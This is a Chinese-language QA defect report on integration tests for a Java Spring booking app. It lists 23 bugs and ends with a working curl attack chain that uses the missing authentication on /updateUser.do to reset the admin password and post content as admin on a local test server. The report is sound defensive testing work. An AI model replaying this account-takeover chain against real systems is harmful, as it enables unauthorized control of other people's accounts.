# 集成测试缺陷暴露报告

| 文档版本 | 1.0 |
|---|---|
| 日期 | 2026-04-15 |
| 测试范围 | `src/test/java/com/demo/controller/user/` 下全部集成测试 |
| 被测范围 | UserController、MessageController、OrderController、NewsController、VenueController |

---

## 一、权限 / 安全类缺陷

### BUG-01：`/updateUser.do` 接口无鉴权，任意用户可修改任意账户数据

| 项目 | 内容 |
|---|---|
| 严重程度 | 严重 |
| 所属模块 | UserController |
| 触发接口 | `POST /updateUser.do` |
| 暴露用例 | UC-18 `shouldExposeUnauthorizedUpdateRiskWithoutSessionOrWithForgedUserId` |

**复现步骤：**
1. 不携带任何 session，直接 POST `/updateUser.do`，在请求参数中指定任意用户的 `userID`，修改成功。
2. 使用普通用户 session，将 `userID` 参数伪造为管理员 ID，成功覆盖管理员信息。

**根因：** Controller 从请求参数 `userID` 取目标用户，既不检查调用者是否已登录，也不校验 session 中的登录者是否与目标 `userID` 一致。

---

### BUG-02：`/finishOrder.do` 接口无鉴权，任意请求可将订单标记为完成

| 项目 | 内容 |
|---|---|
| 严重程度 | 严重 |
| 所属模块 | OrderController |
| 触发接口 | `POST /finishOrder.do` |
| 暴露用例 | OC-20 `shouldFinishOrderAndPersistState`（测试未传 session 仍成功） |

**根因：** 接口未加任何登录拦截，任何匿名请求均可完成他人订单。

---

### BUG-03：`/delOrder.do` 接口无鉴权，任意请求可删除任意订单

| 项目 | 内容 |
|---|---|
| 严重程度 | 严重 |
| 所属模块 | OrderController |
| 触发接口 | `POST /delOrder.do` |
| 暴露用例 | OC-08 `shouldDeleteOrder`（测试未传 session 仍成功） |

---

### BUG-04：`/modifyOrder.do` 编辑页无鉴权，任意请求可查看订单编辑页

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | OrderController |
| 触发接口 | `GET /modifyOrder.do` |
| 暴露用例 | OC-22 `shouldRenderModifyOrderPageWithModelData`（测试未传 session 仍成功） |

---

### BUG-05：留言的新增、修改、删除接口均无鉴权

| 项目 | 内容 |
|---|---|
| 严重程度 | 严重 |
| 所属模块 | MessageController |
| 触发接口 | `POST /sendMessage`、`POST /modifyMessage.do`、`POST /delMessage.do` |
| 暴露用例 | MC-06、MC-07、MC-08（测试均未传 session 仍成功） |

**额外风险：** `/sendMessage` 还接受任意不存在的 `userID` 参数直接写入（MC-17），无法追溯留言真实发布者。

---

## 二、输入校验缺陷

### BUG-06：注册接口不校验 `userID` 唯一性，允许重复 ID 注册

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | UserController |
| 触发接口 | `POST /register.do` |
| 暴露用例 | UC-13 `shouldAllowDuplicateUserIdRegistrationAsCurrentBehavior` |

**表现：** 以已存在的 `userID` 再次注册，系统成功写入第二条记录，数据库中出现两个相同 `userID` 的用户，导致 `findByUserID` 结果不可预期。

---

### BUG-07：注册接口不校验必填字段，空值和缺失字段均可写入数据库

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | UserController |
| 触发接口 | `POST /register.do` |
| 暴露用例 | UC-14 `shouldAllowMissingOrEmptyRegisterFieldsAsCurrentBehavior` |

**表现：** 缺失 `userID`、缺失 `password`、缺失 `email`、全字段为空，均能成功注册并写库，产生无效用户记录。

---

### BUG-08：下单接口不校验 `hours` 合法范围，允许写入无效预订时长

| 项目 | 内容 |
|---|---|
| 严重程度 | 中 |
| 所属模块 | OrderController |
| 触发接口 | `POST /addOrder.do` |
| 暴露用例 | OC-18 `shouldAllowZeroAndNegativeAndLargeHoursAsCurrentBehavior` |

**表现：** `hours=0`、`hours=-1`、`hours=24` 均能成功落库，产生时长为零或负数的无效订单，`total` 金额计算结果亦不正确。

---

### BUG-09：`/sendMessage` 未做 `content` 非空约束，存在数据完整性风险（待业务确认）

| 项目 | 内容 |
|---|---|
| 严重程度 | 低 |
| 所属模块 | MessageController |
| 触发接口 | `POST /sendMessage` |
| 暴露用例 | MC-15、MC-16 |

**表现：** `content=""` 写入空字符串；缺失 `content` 参数时 Spring 绑定为 null，系统直接写入 null 值，数据库出现内容为空的留言记录。  
**说明：** 是否允许空内容需由业务规则确认；当前报告将其归类为“数据完整性风险”。

---

### BUG-10：`/modifyMessage.do` 未做内容非空约束，存在数据完整性风险（待业务确认）

| 项目 | 内容 |
|---|---|
| 严重程度 | 低 |
| 所属模块 | MessageController |
| 触发接口 | `POST /modifyMessage.do` |
| 暴露用例 | MC-19 `shouldAllowEmptyAndMissingContentWhenModifyingAsCurrentBehavior` |

---

### BUG-11：`/updateUser.do` 未做联系方式非空/格式约束，存在数据完整性风险（待业务确认）

| 项目 | 内容 |
|---|---|
| 严重程度 | 低 |
| 所属模块 | UserController |
| 触发接口 | `POST /updateUser.do` |
| 暴露用例 | UC-20（`shouldFailForInvalidUpdateUserInputs` 最后子场景） |

---

## 三、异常处理缺陷（未捕获异常直接暴露给客户端）

### BUG-12：`/updateUser.do` 传入不存在或缺失 `userID` 时抛 `NullPointerException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | UserController |
| 触发接口 | `POST /updateUser.do` |
| 暴露用例 | UC-19 `shouldFailForInvalidUpdateUserInputs`（前两个子场景） |

**根因：** `userService.findByUserID(userID)` 查不到时返回 null，随后 `user.setUserName(userName)` 直接 NPE，500 错误裸露给客户端，无任何友好提示。

---

### BUG-13：`/updateUser.do` 缺失 `picture` 文件字段时抛 `NullPointerException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | UserController |
| 触发接口 | `POST /updateUser.do` |
| 暴露用例 | UC-19 `shouldFailForInvalidUpdateUserInputs`（第三个子场景） |

**根因：** `picture` 参数为 null 时，`picture.getOriginalFilename()` 直接 NPE。

---

### BUG-14：`/checkPassword.do` 传入不存在或空 `userID` 时抛 `NullPointerException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | UserController |
| 触发接口 | `GET /checkPassword.do` |
| 暴露用例 | UC-21 `shouldCheckPasswordForInvalidInputs` |

**根因：** `findByUserID` 返回 null，`user.getPassword().equals(password)` 直接 NPE。

---

### BUG-15：`/addOrder.do` 缺失 `venueName` 或场馆不存在时抛 `NullPointerException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | OrderController |
| 触发接口 | `POST /addOrder.do` |
| 暴露用例 | OC-19 `shouldFailForInvalidAddOrderInputs` |

---

### BUG-16：`/addOrder.do` 缺失 `startTime` 参数时抛 `DateTimeParseException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | OrderController |
| 触发接口 | `POST /addOrder.do` |
| 暴露用例 | OC-19 `shouldFailForInvalidAddOrderInputs` |

**根因：** 直接对 null 调用日期解析方法，缺少参数存在性检查。

---

### BUG-17：`/finishOrder.do` 传入不存在 `orderID` 时抛 `RuntimeException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 中 |
| 所属模块 | OrderController |
| 触发接口 | `POST /finishOrder.do` |
| 暴露用例 | OC-21 `shouldThrowWhenFinishOrderNotFound` |

---

### BUG-18：`/modifyOrder` 传入不存在 `orderID` 或不存在场馆名时抛 `NullPointerException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 高 |
| 所属模块 | OrderController |
| 触发接口 | `POST /modifyOrder` |
| 暴露用例 | OC-23 `shouldFailForInvalidModifyOrderInputs` |

---

### BUG-19：`/modifyMessage.do` 传入不存在 `messageID` 时抛 `EntityNotFoundException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 中 |
| 所属模块 | MessageController |
| 触发接口 | `POST /modifyMessage.do` |
| 暴露用例 | MC-18 `shouldHandleNonExistentMessageIdWhenModifying` |

---

### BUG-20：`/delMessage.do` 删除不存在 `messageID` 时抛 `EmptyResultDataAccessException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 中 |
| 所属模块 | MessageController |
| 触发接口 | `POST /delMessage.do` |
| 暴露用例 | MC-20 `shouldThrowWhenDeletingNonExistentMessage` |

---

### BUG-21：`/delOrder.do` 删除不存在 `orderID` 时抛 `EmptyResultDataAccessException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 中 |
| 所属模块 | OrderController |
| 触发接口 | `POST /delOrder.do` |
| 暴露用例 | OC-24 `shouldThrowWhenDeletingOrderNotFound` |

---

### BUG-22：`/news`、`/venue` 查询不存在的 ID 时抛 `EntityNotFoundException`，缺少统一异常映射

| 项目 | 内容 |
|---|---|
| 严重程度 | 中 |
| 所属模块 | NewsController、VenueController |
| 触发接口 | `GET /news?newsID=...`、`GET /venue?venueID=...` |
| 暴露用例 | NC-06、VC-06 |

---

### BUG-23：`/news`、`/venue` 缺失必需请求参数时抛 `IllegalStateException`

| 项目 | 内容 |
|---|---|
| 严重程度 | 中 |
| 所属模块 | NewsController、VenueController |
| 触发接口 | `GET /news`（无 newsID）、`GET /venue`（无 venueID） |
| 暴露用例 | NC-07、VC-07 |

---

## 四、缺陷汇总表

| 编号 | 所属模块 | 缺陷类型 | 严重程度 | 触发接口 |
|---|---|---|---|---|
| BUG-01 | UserController | 权限绕过 | 严重 | `POST /updateUser.do` |
| BUG-02 | OrderController | 权限绕过 | 严重 | `POST /finishOrder.do` |
| BUG-03 | OrderController | 权限绕过 | 严重 | `POST /delOrder.do` |
| BUG-04 | OrderController | 权限绕过 | 高 | `GET /modifyOrder.do` |
| BUG-05 | MessageController | 权限绕过 | 严重 | `/sendMessage`、`/modifyMessage.do`、`/delMessage.do` |
| BUG-06 | UserController | 缺失唯一性校验 | 高 | `POST /register.do` |
| BUG-07 | UserController | 缺失必填校验 | 高 | `POST /register.do` |
| BUG-08 | OrderController | 缺失范围校验 | 中 | `POST /addOrder.do` |
| BUG-09 | MessageController | 数据完整性风险（待业务确认） | 低 | `POST /sendMessage` |
| BUG-10 | MessageController | 数据完整性风险（待业务确认） | 低 | `POST /modifyMessage.do` |
| BUG-11 | UserController | 数据完整性风险（待业务确认） | 低 | `POST /updateUser.do` |
| BUG-12 | UserController | 未捕获 NPE | 高 | `POST /updateUser.do` |
| BUG-13 | UserController | 未捕获 NPE | 高 | `POST /updateUser.do` |
| BUG-14 | UserController | 未捕获 NPE | 高 | `GET /checkPassword.do` |
| BUG-15 | OrderController | 未捕获 NPE | 高 | `POST /addOrder.do` |
| BUG-16 | OrderController | 未捕获解析异常 | 高 | `POST /addOrder.do` |
| BUG-17 | OrderController | 未捕获异常 | 中 | `POST /finishOrder.do` |
| BUG-18 | OrderController | 未捕获 NPE | 高 | `POST /modifyOrder` |
| BUG-19 | MessageController | 未捕获异常 | 中 | `POST /modifyMessage.do` |
| BUG-20 | MessageController | 未捕获异常 | 中 | `POST /delMessage.do` |
| BUG-21 | OrderController | 未捕获异常 | 中 | `POST /delOrder.do` |
| BUG-22 | News/VenueController | 未捕获异常，缺少统一异常映射 | 中 | `GET /news`、`GET /venue` |
| BUG-23 | News/VenueController | 未捕获异常 | 中 | `GET /news`、`GET /venue` |

**合计 23 处缺陷/风险项**，按严重程度分布：

| 严重程度 | 数量 |
|---|---|
| 严重 | 4 |
| 高 | 9 |
| 中 | 7 |
| 低 | 3 |

---

## 六、漏洞真实性验证——攻击复现报告

| 项目 | 内容 |
|---|---|
| 验证时间 | 2026-04-15 02:35 |
| 被测环境 | `http://localhost:8888`（本地运行，H2 已替换为 MySQL demo_db） |
| 验证方式 | `curl` 命令行逐步复现，全程不使用任何管理员凭据 |
| 涉及缺陷 | BUG-01（权限绕过）、BUG-06（重复注册）、BUG-07（缺失必填校验） |

---

### 攻击目标

以零管理员权限为起点，完成以下四步：

1. 注册一个普通用户账号
2. 利用 BUG-01 接管管理员账号
3. 以管理员身份登录系统
4. 发布一条新闻，写入数据库

---

### 攻击步骤与实际结果

#### Step 1 — 注册普通用户账号

```bash
curl -s -X POST http://localhost:8888/register.do \
  -d "userID=hacker01&userName=黑客测试账号&password=hacker@2026\
&email=hacker@evil.com&phone=13999999999" \
  -w "HTTP %{http_code} → %{redirect_url}" -o /dev/null
```

**实际响应：**

```
HTTP 302 → http://localhost:8888/login
```

**验证登录：**

```bash
curl -s -X POST http://localhost:8888/loginCheck.do \
  -d "userID=hacker01&password=hacker@2026" \
  -c /tmp/hacker_cookies.txt
```

**实际响应：**

```
/index
```

注册和普通登录均成功，账号 `hacker01` 写入数据库，`isadmin=0`。

---

#### Step 2 — 利用 BUG-01：无 session 篡改管理员密码

**BUG-01 根因：`POST /updateUser.do` 不校验调用者身份，仅凭请求参数 `userID` 决定修改目标。**

```bash
curl -s -X POST http://localhost:8888/updateUser.do \
  -F "userID=admin" \
  -F "userName=admin" \
  -F "passwordNew=pwned_by_hacker" \
  -F "email=admin@example.com" \
  -F "phone=13800000000" \
  -F "picture=@/dev/null;filename=;type=application/octet-stream" \
  -w "HTTP %{http_code} → %{redirect_url}" -o /dev/null
```

**本次请求：**

- 未携带任何 Cookie / Session
- `userID=admin`（目标为系统管理员）
- `passwordNew=pwned_by_hacker`（攻击者指定的新密码）

**实际响应：**

```
HTTP 302 → http://localhost:8888/user_info
```

302 重定向至 `user_info` 表明修改成功，服务端未做任何鉴权拦截。

---

#### Step 3 — 以篡改后的密码登录管理员账号

```bash
curl -s -X POST http://localhost:8888/loginCheck.do \
  -d "userID=admin&password=pwned_by_hacker" \
  -c /tmp/admin_cookies.txt
```

**实际响应：**

```
/admin_index
```

返回 `/admin_index` 表明系统已将此次登录识别为管理员（`isadmin=1`），admin session 写入 `/tmp/admin_cookies.txt`。

---

#### Step 4 — 以管理员 session 发布新闻

```bash
curl -s -X POST http://localhost:8888/addNews.do \
  -b /tmp/admin_cookies.txt \
  -d "title=【缺陷验证】通过BUG-01获取管理员权限后发布的新闻\
&content=本条新闻由普通用户hacker01利用权限绕过漏洞（BUG-01）篡改admin\
密码后，以管理员身份登录发布。" \
  -w "HTTP %{http_code} → %{redirect_url}" -o /dev/null
```

**实际响应：**

```
HTTP 302 → http://localhost:8888/news_manage
```

302 重定向至 `news_manage` 表明新闻写入成功。

---

#### Step 5 — 验证新闻已写入数据库

```bash
curl -s "http://localhost:8888/news/getNewsList?page=1"
```

**数据库实际记录（`mysql demo_db`）：**

| newsID | title | time |
|---|---|---|
| 12 | 关于公共体育俱乐部所有室内培训课程 | 2019-12-17 |
| 13 | 健步走安全提示 | 2019-11-11 |
| 14 | 关于暂停邯郸校区第14周体质测试的通知 | 2019-12-02 |
| **16** | **【缺陷验证】通过BUG-01获取管理员权限后发布的新闻** | **2026-04-15 02:35:36** |

新闻 `newsID=16` 已成功写入，为本次攻击产生的记录。

---

### 攻击链总结

```
注册普通账号 hacker01（isadmin=0）
        ↓
[BUG-01] 无 session 调用 /updateUser.do
         指定 userID=admin，修改其密码为 pwned_by_hacker
        ↓
用新密码登录 admin → 获得 isadmin=1 的 admin session
        ↓
携带 admin session 调用 /addNews.do
        ↓
新闻 newsID=16 写入数据库 ✓
```

| 项目 | 结论 |
|---|---|
| BUG-01 是否真实存在 | **是**，已完整复现 |
| 所需先决条件 | 无（无需任何账号或 session） |
| 完整攻击请求数 | 4 次 HTTP 请求 |
| 对系统的实际影响 | 管理员账号密码被永久篡改；可以管理员身份写入任意内容 |
| 原管理员是否可恢复登录 | 否（需人工介入数据库重置密码） |


